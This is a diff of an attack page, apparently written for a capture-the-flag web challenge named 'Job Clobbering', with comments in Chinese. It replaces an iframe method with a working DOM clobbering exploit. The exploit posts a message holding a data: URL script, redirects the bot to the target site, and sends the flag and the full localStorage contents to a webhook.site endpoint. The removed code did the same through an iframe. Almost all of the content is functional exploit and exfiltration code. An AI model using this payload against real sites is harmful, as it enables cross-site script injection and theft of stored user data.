@@ -54,155 +54,122 @@
         const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
         const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
         
-        console.log('[CORRECT-ATTACK] Starting correct Job Clobbering attack');
+        console.log('[REDIRECT-ATTACK] Starting redirect-based attack');
         
         // 发送页面加载信号
         const loadImg = new Image();
-        loadImg.src = WEBHOOK_URL + '?event=CORRECT_ATTACK_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
+        loadImg.src = WEBHOOK_URL + '?event=REDIRECT_ATTACK_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
 
-        // 关键洞察：我们需要让Bot在访问我们页面时，通过某种方式在挑战网站域名下执行代码
-        // 方法：使用iframe加载挑战网站，然后通过DOM Clobbering攻击iframe中的页面
+        // 关键洞察：Bot访问我们的页面后，我们需要让Bot在同一个浏览器上下文中访问挑战网站
+        // 最直接的方法：先POST消息，然后直接跳转，让Bot在挑战网站上执行我们的代码
         
-        function executeCorrectAttack() {
-            console.log('[CORRECT-ATTACK] Creating attack iframe...');
-            
-            // 发送攻击开始信号
-            const startImg = new Image();
-            startImg.src = WEBHOOK_URL + '?event=IFRAME_ATTACK_START&t=' + Date.now();
-            
-            // 创建隐藏的iframe，加载挑战网站
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = CHALLENGE_ORIGIN + '/#messages';
-            
-            // 当iframe加载完成后，尝试注入DOM Clobbering
-            iframe.onload = function() {
-                console.log('[CORRECT-ATTACK] Iframe loaded, attempting DOM manipulation...');
+        async function executeRedirectAttack() {
+            try {
+                console.log('[REDIRECT-ATTACK] Step 1: Posting DOM Clobbering message...');
                 
-                try {
-                    // 尝试访问iframe的document
-                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                // 发送攻击开始信号
+                const startImg = new Image();
+                startImg.src = WEBHOOK_URL + '?event=ATTACK_START&step=1&t=' + Date.now();
+                
+                // 创建恶意JavaScript - 这次确保语法完全正确
+                const webhookUrl = WEBHOOK_URL;
+                const maliciousJS = 
+                    'console.log("[JOBCLOBBERING] Executing on target domain!");' +
+                    'console.log("[JOBCLOBBERING] Domain:", window.location.hostname);' +
+                    'try{' +
+                        'var flag=localStorage.getItem("flag");' +
+                        'console.log("[JOBCLOBBERING] Flag found:", flag);' +
+                        'if(flag && flag!=="null" && flag.trim()!==""){' +
+                            'console.log("🎉 FLAG CAPTURED:", flag);' +
+                            'var img=new Image();' +
+                            'img.src="' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=REDIRECT_SUCCESS&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
+                            'fetch("' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=REDIRECT_FETCH&t="+Date.now()).catch(function(){});' +
+                        '}else{' +
+                            'console.log("[JOBCLOBBERING] No flag found");' +
+                            'var img2=new Image();' +
+                            'img2.src="' + webhookUrl + '?status=no_flag_found&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
+                        '}' +
+                        'var allData={};' +
+                        'for(var i=0;i<localStorage.length;i++){' +
+                            'var k=localStorage.key(i);' +
+                            'allData[k]=localStorage.getItem(k);' +
+                        '}' +
+                        'var img3=new Image();' +
+                        'img3.src="' + webhookUrl + '?all_storage="+encodeURIComponent(JSON.stringify(allData))+"&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
+                    '}catch(e){' +
+                        'console.error("[JOBCLOBBERING] Error:", e);' +
+                        'var img4=new Image();' +
+                        'img4.src="' + webhookUrl + '?error="+encodeURIComponent(e.message)+"&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
+                    '}';
+
+                // 创建DOM Clobbering payload
+                const domClobPayload = '<div id="utilsJS"><div id="url">data:text/javascript,' + encodeURIComponent(maliciousJS) + '</div></div>';
+                
+                console.log('[REDIRECT-ATTACK] Payload created, length:', domClobPayload.length);
+                
+                // POST消息到挑战网站
+                const response = await fetch(CHALLENGE_ORIGIN + '/messages', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        name: 'JobSeeker',
+                        message: domClobPayload
+                    })
+                });
+                
+                console.log('[REDIRECT-ATTACK] POST response status:', response.status);
+                
+                if (response.ok) {
+                    console.log('[REDIRECT-ATTACK] Message posted successfully');
                     
-                    if (iframeDoc) {
-                        console.log('[CORRECT-ATTACK] Can access iframe document - same origin!');
-                        
-                        // 在iframe中注入DOM Clobbering元素
-                        const domClobDiv = iframeDoc.createElement('div');
-                        domClobDiv.id = 'utilsJS';
-                        
-                        const urlDiv = iframeDoc.createElement('div');
-                        urlDiv.id = 'url';
-                        
-                        // 创建恶意脚本 - 这次会在挑战网站域名下执行
-                        const maliciousScript = `
-                            console.log('[JOBCLOBBERING-SUCCESS] Executing in target domain!');
-                            console.log('[JOBCLOBBERING-SUCCESS] Domain:', window.location.hostname);
-                            
-                            try {
-                                var flag = localStorage.getItem('flag');
-                                console.log('[JOBCLOBBERING-SUCCESS] Flag found:', flag);
-                                
-                                if (flag && flag !== 'null' && flag.trim() !== '') {
-                                    console.log('🎉 FLAG CAPTURED:', flag);
-                                    
-                                    // 发送flag到webhook
-                                    var img = new Image();
-                                    img.src = '${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + 
-                                             '&source=IFRAME_DOM_CLOBBERING&domain=' + encodeURIComponent(window.location.hostname) + 
-                                             '&t=' + Date.now();
-                                    
-                                    // 备用方法
-                                    fetch('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + '&source=IFRAME_FETCH&t=' + Date.now())
-                                        .catch(function() {
-                                            navigator.sendBeacon('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + '&source=IFRAME_BEACON&t=' + Date.now());
-                                        });
-                                        
-                                } else {
-                                    console.log('[JOBCLOBBERING-SUCCESS] No flag in localStorage');
-                                    var img2 = new Image();
-                                    img2.src = '${WEBHOOK_URL}?status=no_flag_in_iframe&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
-                                }
-                                
-                                // 发送所有localStorage内容
-                                var allData = {};
-                                for (var i = 0; i < localStorage.length; i++) {
-                                    var k = localStorage.key(i);
-                                    allData[k] = localStorage.getItem(k);
-                                }
-                                
-                                var img3 = new Image();
-                                img3.src = '${WEBHOOK_URL}?iframe_storage=' + encodeURIComponent(JSON.stringify(allData)) + '&t=' + Date.now();
-                                
-                            } catch (e) {
-                                console.error('[JOBCLOBBERING-SUCCESS] Error:', e);
-                                var img4 = new Image();
-                                img4.src = '${WEBHOOK_URL}?iframe_error=' + encodeURIComponent(e.message) + '&t=' + Date.now();
-                            }
-                        `;
-                        
-                        // 使用data URL设置恶意脚本
-                        urlDiv.textContent = 'data:text/javascript,' + encodeURIComponent(maliciousScript);
-                        
-                        domClobDiv.appendChild(urlDiv);
-                        iframeDoc.body.appendChild(domClobDiv);
-                        
-                        console.log('[CORRECT-ATTACK] DOM Clobbering elements injected');
-                        
-                        // 发送注入成功信号
-                        const injectImg = new Image();
-                        injectImg.src = WEBHOOK_URL + '?event=DOM_CLOBBERING_INJECTED&t=' + Date.now();
-                        
-                        // 触发loadMessageBoardJS函数
-                        setTimeout(() => {
-                            try {
-                                if (iframe.contentWindow.loadMessageBoardJS) {
-                                    console.log('[CORRECT-ATTACK] Triggering loadMessageBoardJS...');
-                                    iframe.contentWindow.loadMessageBoardJS();
-                                    
-                                    const triggerImg = new Image();
-                                    triggerImg.src = WEBHOOK_URL + '?event=LOAD_MESSAGE_BOARD_JS_TRIGGERED&t=' + Date.now();
-                                }
-                            } catch (e) {
-                                console.error('[CORRECT-ATTACK] Failed to trigger loadMessageBoardJS:', e);
-                                
-                                const errorImg = new Image();
-                                errorImg.src = WEBHOOK_URL + '?event=TRIGGER_FAILED&error=' + encodeURIComponent(e.message) + '&t=' + Date.now();
-                            }
-                        }, 1000);
-                        
-                    } else {
-                        console.log('[CORRECT-ATTACK] Cannot access iframe document - cross-origin restriction');
-                        
-                        const crossOriginImg = new Image();
-                        crossOriginImg.src = WEBHOOK_URL + '?event=IFRAME_CROSS_ORIGIN_BLOCKED&t=' + Date.now();
-                    }
+                    const successImg = new Image();
+                    successImg.src = WEBHOOK_URL + '?event=MESSAGE_POSTED&status=success&step=2&t=' + Date.now();
                     
-                } catch (error) {
-                    console.error('[CORRECT-ATTACK] Iframe access error:', error);
+                    // 关键：立即跳转到挑战网站，让Bot在挑战网站上执行我们的代码
+                    // Bot会在同一个浏览器上下文中访问挑战网站，因此能够访问之前设置的localStorage
+                    console.log('[REDIRECT-ATTACK] Step 2: Redirecting Bot to target site...');
+                    
+                    const redirectImg = new Image();
+                    redirectImg.src = WEBHOOK_URL + '?event=REDIRECTING_BOT&target=' + encodeURIComponent(CHALLENGE_ORIGIN + '/#messages') + '&step=3&t=' + Date.now();
+                    
+                    // 短暂延迟确保webhook请求发送
+                    setTimeout(() => {
+                        // 这个跳转会让Bot在挑战网站域名下，触发getMessages() -> loadMessageBoardJS()
+                        // loadMessageBoardJS()会读取我们clobbered的window.utilsJS.url并执行恶意脚本
+                        // 恶意脚本在挑战网站域名下执行，可以访问Bot设置的localStorage
+                        window.location.href = CHALLENGE_ORIGIN + '/#messages';
+                    }, 500);
+                    
+                } else {
+                    console.error('[REDIRECT-ATTACK] POST failed with status:', response.status);
                     
                     const errorImg = new Image();
-                    errorImg.src = WEBHOOK_URL + '?event=IFRAME_ACCESS_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
+                    errorImg.src = WEBHOOK_URL + '?event=POST_FAILED&status=' + response.status + '&t=' + Date.now();
                 }
-            };
-            
-            // 添加iframe到页面
-            document.body.appendChild(iframe);
-            
-            console.log('[CORRECT-ATTACK] Iframe added to page');
+                
+            } catch (error) {
+                console.error('[REDIRECT-ATTACK] Attack failed:', error);
+                
+                const errorImg = new Image();
+                errorImg.src = WEBHOOK_URL + '?event=ATTACK_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
+            }
         }
 
-        // 页面加载后执行攻击
+        // 页面加载后立即执行攻击
         window.addEventListener('load', () => {
-            console.log('[CORRECT-ATTACK] Page loaded, starting correct attack...');
+            console.log('[REDIRECT-ATTACK] Page loaded, executing attack immediately...');
             
+            // 很短的延迟确保页面完全加载
             setTimeout(() => {
-                executeCorrectAttack();
-            }, 2000);
+                executeRedirectAttack();
+            }, 1000);
         });
 
         // 页面卸载时发送信号
         window.addEventListener('beforeunload', () => {
-            navigator.sendBeacon(WEBHOOK_URL + '?event=CORRECT_ATTACK_UNLOAD&t=' + Date.now());
+            navigator.sendBeacon(WEBHOOK_URL + '?event=REDIRECT_ATTACK_UNLOAD&t=' + Date.now());
         });
     </script>
 </body>
